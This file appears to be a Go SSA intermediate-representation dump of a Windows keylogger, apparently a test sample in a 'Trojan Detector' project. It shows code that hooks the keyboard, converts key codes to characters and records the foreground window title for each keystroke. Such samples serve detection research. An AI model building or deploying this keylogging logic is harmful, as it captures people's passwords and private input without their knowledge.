# Name: command-line-arguments.init
# Package: command-line-arguments
# Synthetic: package initializer
func init():
0:                                                                entry P:0 S:2
	t0 = *init$guard                                                   bool
	if t0 goto 2 else 1
1:                                                           init.start P:1 S:1
	*init$guard = true:bool
	t1 = fmt.init()                                                      ()
	t2 = os.init()                                                       ()
	t3 = os/signal.init()                                                ()
	t4 = syscall.init()                                                  ()
	t5 = unsafe.init()                                                   ()
	t6 = github.com/moutend/go-hook/pkg/keyboard.init()                  ()
	t7 = github.com/moutend/go-hook/pkg/types.init()                     ()
	t8 = golang.org/x/sys/windows.init()                                 ()
	t9 = golang.org/x/sys/windows.NewLazyDLL("user32.dll":string) *golang.org/x/sys/windows.LazyDLL
	*mod = t9
	t10 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t11 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t10, "GetKeyState":string) *golang.org/x/sys/windows.LazyProc
	*procGetKeyState = t11
	t12 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t13 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t12, "GetKeyboardLayout":string) *golang.org/x/sys/windows.LazyProc
	*procGetKeyboardLayout = t13
	t14 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t15 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t14, "GetKeyboardState":string) *golang.org/x/sys/windows.LazyProc
	*procGetKeyboardState = t15
	t16 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t17 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t16, "ToUnicodeEx":string) *golang.org/x/sys/windows.LazyProc
	*procToUnicodeEx = t17
	t18 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t19 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t18, "GetWindowTextW":string) *golang.org/x/sys/windows.LazyProc
	*procGetWindowText = t19
	t20 = *mod                            *golang.org/x/sys/windows.LazyDLL
	t21 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t20, "GetWindowTextLengthW":string) *golang.org/x/sys/windows.LazyProc
	*procGetWindowTextLength = t21
	jump 2
2:                                                            init.done P:2 S:0
	return

# Name: command-line-arguments.GetWindowTextLength
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\keylogger\keylogger.go:36:6
func GetWindowTextLength(hwnd HWND) int:
0:                                                                entry P:0 S:0
	t0 = *procGetWindowTextLength        *golang.org/x/sys/windows.LazyProc
	t1 = changetype uintptr <- HWND (hwnd)                          uintptr
	t2 = new [1]uintptr (varargs)                               *[1]uintptr
	t3 = &t2[0:int]                                                *uintptr
	*t3 = t1
	t4 = slice t2[:]                                              []uintptr
	t5 = (*golang.org/x/sys/windows.LazyProc).Call(t0, t4...) (r1 uintptr, r2 uintptr, lastErr error)
	t6 = extract t5 #0                                              uintptr
	t7 = extract t5 #1                                              uintptr
	t8 = extract t5 #2                                                error
	t9 = convert int <- uintptr (t6)                                    int
	return t9

# Name: command-line-arguments.GetWindowText
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\keylogger\keylogger.go:44:6
func GetWindowText(hwnd HWND) string:
0:                                                                entry P:0 S:0
	t0 = GetWindowTextLength(hwnd)                                      int
	t1 = t0 + 1:int                                                     int
	t2 = make []uint16 t1 t1                                       []uint16
	t3 = *procGetWindowText              *golang.org/x/sys/windows.LazyProc
	t4 = changetype uintptr <- HWND (hwnd)                          uintptr
	t5 = &t2[0:int]                                                 *uint16
	t6 = convert unsafe.Pointer <- *uint16 (t5)              unsafe.Pointer
	t7 = convert uintptr <- unsafe.Pointer (t6)                     uintptr
	t8 = convert uintptr <- int (t1)                                uintptr
	t9 = new [3]uintptr (varargs)                               *[3]uintptr
	t10 = &t9[0:int]                                               *uintptr
	*t10 = t4
	t11 = &t9[1:int]                                               *uintptr
	*t11 = t7
	t12 = &t9[2:int]                                               *uintptr
	*t12 = t8
	t13 = slice t9[:]                                             []uintptr
	t14 = (*golang.org/x/sys/windows.LazyProc).Call(t3, t13...) (r1 uintptr, r2 uintptr, lastErr error)
	t15 = syscall.UTF16ToString(t2)                                  string
	return t15

# Name: command-line-arguments.GetForegroundWindow
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\keylogger\keylogger.go:57:6
func GetForegroundWindow() uintptr:
0:                                                                entry P:0 S:0
	t0 = *mod                             *golang.org/x/sys/windows.LazyDLL
	t1 = (*golang.org/x/sys/windows.LazyDLL).NewProc(t0, "GetForegroundWindow":string) *golang.org/x/sys/windows.LazyProc
	t2 = (*golang.org/x/sys/windows.LazyProc).Call(t1, nil:[]uintptr...) (r1 uintptr, r2 uintptr, lastErr error)
	t3 = extract t2 #0                                              uintptr
	t4 = extract t2 #1                                              uintptr
	t5 = extract t2 #2                                                error
	return t3

# Name: command-line-arguments.Run
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\keylogger\keylogger.go:64:6
# Recover: 3
# Locals:
#   0:	t0 error
#   1:	t29 github.com/moutend/go-hook/pkg/types.KeyboardEvent
func Run(key_out chan rune, window_out chan string) error:
0:                                                                entry P:0 S:2
	t0 = local error ()                                              *error
	t1 = make chan github.com/moutend/go-hook/pkg/types.KeyboardEvent 100:int chan github.com/moutend/go-hook/pkg/types.KeyboardEvent
	t2 = changetype chan<- github.com/moutend/go-hook/pkg/types.KeyboardEvent <- chan github.com/moutend/go-hook/pkg/types.KeyboardEvent (t1) chan<- github.com/moutend/go-hook/pkg/types.KeyboardEvent
	t3 = github.com/moutend/go-hook/pkg/keyboard.Install(nil:github.com/moutend/go-hook/pkg/keyboard.HookHandler, t2) error
	t4 = t3 != nil:error                                               bool
	if t4 goto 1 else 2
1:                                                              if.then P:1 S:0
	*t0 = t3
	rundefers
	t5 = *t0                                                          error
	return t5
2:                                                              if.done P:1 S:1
	defer github.com/moutend/go-hook/pkg/keyboard.Uninstall()
	t6 = make chan os.Signal 1:int                           chan os.Signal
	t7 = *os.Interrupt                                            os.Signal
	t8 = changetype chan<- os.Signal <- chan os.Signal (t6) chan<- os.Signal
	t9 = new [1]os.Signal (varargs)                           *[1]os.Signal
	t10 = &t9[0:int]                                             *os.Signal
	*t10 = t7
	t11 = slice t9[:]                                           []os.Signal
	t12 = os/signal.Notify(t8, t11...)                                   ()
	t13 = new [1]any (varargs)                                      *[1]any
	t14 = &t13[0:int]                                                  *any
	t15 = make any <- string ("start capturing k...":string)            any
	*t14 = t15
	t16 = slice t13[:]                                                []any
	t17 = fmt.Println(t16...)                            (n int, err error)
	jump 4
3:                                                              recover P:0 S:0
	t18 = *t0                                                         error
	return t18
4:                                                             for.body P:4 S:2
	t19 = select blocking [<-t6, <-t1] (index int, ok bool, os.Signal, github.com/moutend/go-hook/pkg/types.KeyboardEvent)
	t20 = extract t19 #0                                                int
	t21 = t20 == 0:int                                                 bool
	if t21 goto 5 else 6
5:                                                          select.body P:1 S:0
	t22 = new [1]any (varargs)                                      *[1]any
	t23 = &t22[0:int]                                                  *any
	t24 = make any <- string ("Received shutdown...":string)            any
	*t23 = t24
	t25 = slice t22[:]                                                []any
	t26 = fmt.Println(t25...)                            (n int, err error)
	*t0 = nil:error
	rundefers
	t27 = *t0                                                         error
	return t27
6:                                                          select.next P:1 S:2
	t28 = t20 == 1:int                                                 bool
	if t28 goto 7 else 8
7:                                                          select.body P:1 S:2
	t29 = local github.com/moutend/go-hook/pkg/types.KeyboardEvent (k) *github.com/moutend/go-hook/pkg/types.KeyboardEvent
	t30 = extract t19 #3 github.com/moutend/go-hook/pkg/types.KeyboardEvent
	*t29 = t30
	t31 = GetForegroundWindow()                                     uintptr
	t32 = t31 != 0:uintptr                                             bool
	if t32 goto 9 else 4
8:                                                          select.next P:1 S:0
	t33 = make interface{} <- string ("blocking select m...":string) interface{}
	panic t33
9:                                                              if.then P:1 S:2
	t34 = &t29.Message [#0]   *github.com/moutend/go-hook/pkg/types.Message
	t35 = *t34                 github.com/moutend/go-hook/pkg/types.Message
	t36 = t35 == 256:github.com/moutend/go-hook/pkg/types.Message      bool
	if t36 goto 10 else 4
10:                                                             if.then P:1 S:1
	t37 = *t29           github.com/moutend/go-hook/pkg/types.KeyboardEvent
	t38 = VKCodeToAscii(t37)                                           rune
	send key_out <- t38
	t39 = changetype HWND <- uintptr (t31)                             HWND
	t40 = GetWindowText(t39)                                         string
	send window_out <- t40
	jump 4

# Name: command-line-arguments.VKCodeToAscii
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\keylogger\keylogger.go:96:6
# Locals:
#   0:	t0 github.com/moutend/go-hook/pkg/types.KeyboardEvent
func VKCodeToAscii(k github.com/moutend/go-hook/pkg/types.KeyboardEvent) rune:
0:                                                                entry P:0 S:2
	t0 = local github.com/moutend/go-hook/pkg/types.KeyboardEvent (k) *github.com/moutend/go-hook/pkg/types.KeyboardEvent
	*t0 = k
	t1 = new [256]uint16 (makeslice)                           *[256]uint16
	t2 = slice t1[:256:int]                                        []uint16
	t3 = new [256]byte (makeslice)                               *[256]byte
	t4 = slice t3[:256:int]                                          []byte
	t5 = 10:int | 4:int                                                 int
	t6 = *procGetKeyState                *golang.org/x/sys/windows.LazyProc
	t7 = &t0.KBDLLHOOKSTRUCT [#1] *github.com/moutend/go-hook/pkg/types.KBDLLHOOKSTRUCT
	t8 = &t7.VKCode [#0]       *github.com/moutend/go-hook/pkg/types.VKCode
	t9 = *t8                    github.com/moutend/go-hook/pkg/types.VKCode
	t10 = convert uintptr <- github.com/moutend/go-hook/pkg/types.VKCode (t9) uintptr
	t11 = new [1]uintptr (varargs)                              *[1]uintptr
	t12 = &t11[0:int]                                              *uintptr
	*t12 = t10
	t13 = slice t11[:]                                            []uintptr
	t14 = (*golang.org/x/sys/windows.LazyProc).Call(t6, t13...) (r1 uintptr, r2 uintptr, lastErr error)
	t15 = *procGetKeyboardState          *golang.org/x/sys/windows.LazyProc
	t16 = &t4[0:int]                                                  *byte
	t17 = convert unsafe.Pointer <- *byte (t16)              unsafe.Pointer
	t18 = convert uintptr <- unsafe.Pointer (t17)                   uintptr
	t19 = new [1]uintptr (varargs)                              *[1]uintptr
	t20 = &t19[0:int]                                              *uintptr
	*t20 = t18
	t21 = slice t19[:]                                            []uintptr
	t22 = (*golang.org/x/sys/windows.LazyProc).Call(t15, t21...) (r1 uintptr, r2 uintptr, lastErr error)
	t23 = *procGetKeyboardLayout         *golang.org/x/sys/windows.LazyProc
	t24 = new [1]uintptr (varargs)                              *[1]uintptr
	t25 = &t24[0:int]                                              *uintptr
	*t25 = 0:uintptr
	t26 = slice t24[:]                                            []uintptr
	t27 = (*golang.org/x/sys/windows.LazyProc).Call(t23, t26...) (r1 uintptr, r2 uintptr, lastErr error)
	t28 = extract t27 #0                                            uintptr
	t29 = extract t27 #1                                            uintptr
	t30 = extract t27 #2                                              error
	t31 = *procToUnicodeEx               *golang.org/x/sys/windows.LazyProc
	t32 = &t0.KBDLLHOOKSTRUCT [#1] *github.com/moutend/go-hook/pkg/types.KBDLLHOOKSTRUCT
	t33 = &t32.VKCode [#0]     *github.com/moutend/go-hook/pkg/types.VKCode
	t34 = *t33                  github.com/moutend/go-hook/pkg/types.VKCode
	t35 = convert uintptr <- github.com/moutend/go-hook/pkg/types.VKCode (t34) uintptr
	t36 = &t0.KBDLLHOOKSTRUCT [#1] *github.com/moutend/go-hook/pkg/types.KBDLLHOOKSTRUCT
	t37 = &t36.ScanCode [#1]                                        *uint32
	t38 = *t37                                                       uint32
	t39 = convert uintptr <- uint32 (t38)                           uintptr
	t40 = &t4[0:int]                                                  *byte
	t41 = convert unsafe.Pointer <- *byte (t40)              unsafe.Pointer
	t42 = convert uintptr <- unsafe.Pointer (t41)                   uintptr
	t43 = &t2[0:int]                                                *uint16
	t44 = convert unsafe.Pointer <- *uint16 (t43)            unsafe.Pointer
	t45 = convert uintptr <- unsafe.Pointer (t44)                   uintptr
	t46 = convert uintptr <- int (t5)                               uintptr
	t47 = new [7]uintptr (varargs)                              *[7]uintptr
	t48 = &t47[0:int]                                              *uintptr
	*t48 = t35
	t49 = &t47[1:int]                                              *uintptr
	*t49 = t39
	t50 = &t47[2:int]                                              *uintptr
	*t50 = t42
	t51 = &t47[3:int]                                              *uintptr
	*t51 = t45
	t52 = &t47[4:int]                                              *uintptr
	*t52 = 256:uintptr
	t53 = &t47[5:int]                                              *uintptr
	*t53 = t46
	t54 = &t47[6:int]                                              *uintptr
	*t54 = t28
	t55 = slice t47[:]                                            []uintptr
	t56 = (*golang.org/x/sys/windows.LazyProc).Call(t31, t55...) (r1 uintptr, r2 uintptr, lastErr error)
	t57 = syscall.UTF16ToString(t2)                                  string
	t58 = len(t57)                                                      int
	t59 = t58 > 0:int                                                  bool
	if t59 goto 1 else 2
1:                                                              if.then P:1 S:0
	t60 = syscall.UTF16ToString(t2)                                  string
	t61 = convert []rune <- string (t60)                             []rune
	t62 = &t61[0:int]                                                 *rune
	t63 = *t62                                                         rune
	return t63
2:                                                              if.done P:1 S:0
	return 0:rune

